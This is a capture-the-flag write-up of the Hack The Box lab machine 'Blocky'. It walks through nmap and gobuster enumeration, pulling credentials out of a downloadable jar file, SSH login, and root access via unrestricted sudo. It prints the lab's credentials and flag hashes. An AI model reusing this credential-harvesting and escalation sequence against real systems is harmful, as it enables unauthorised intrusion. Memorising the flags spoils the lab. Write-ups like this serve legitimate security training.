# blocky

## Blocky

Blocky was a easy linux machine that involved enumerating to find some files which gave creds so an sql database which then gave more creds needed for ssh. For root it was a really simple priv esc but from a common technique.

> Skills involve in this box:
>
> * enumeration
> * using databases
> * privelage escalation

## USER

> Nmap

```bash
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals port 80 being open as well as ssh open as well.

We check out the website where there doesnt seem to be much so we will further enumerate with gobuster:

```bash
kali@kali:~$ gobuster dir -u http://10.10.10.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.37/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s                                                                                           
===============================================================                                                   
2020/06/13 05:46:10 Starting gobuster                                                                             
===============================================================                                                   
/wiki (Status: 301)
/wp-content (Status: 301)
/plugins (Status: 301)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
```

We checkout the `/plugins` direcotry in the web browser and it takes us to a page where it allows us to downlaod some files.

`BlockCore.jar` is the file we are going to download and take a look at.

we unpack it and read the `BlockyCore.class` file. It ahs some credentials in it which work with ssh as the user notch.

So we have the credentials `notch:8YsqfCTnvxAUeduzjNSXe22` - this is one method of getting user i will explain the second method later.

```bash
kali@kali:~$ ssh notch@10.10.10.37
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.                                         
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.                                       
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                           
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.                                       
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5notch@Blocky:~$
```

## ROOT

We run `sudo -l` to see what we can run as root and it tells us we can run everything as root so we simply just `su root` and read the root flag.

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su 
root@Blocky:/home/notch# cat /root/root.txt
0a9694a5b4d272c694679f7860f1cd5froot@Blocky:/home/notch#
```

The second method is when unpacking there is a file called `BlockCore.jad` whcih contains sql creds We find that `/phpmyadmin` is available so we go to that and login with the creds it gives us in the file.

We then find the password for the user notch in the database and we simply ssh from there.

Thanks for reading hope you enjoyed.

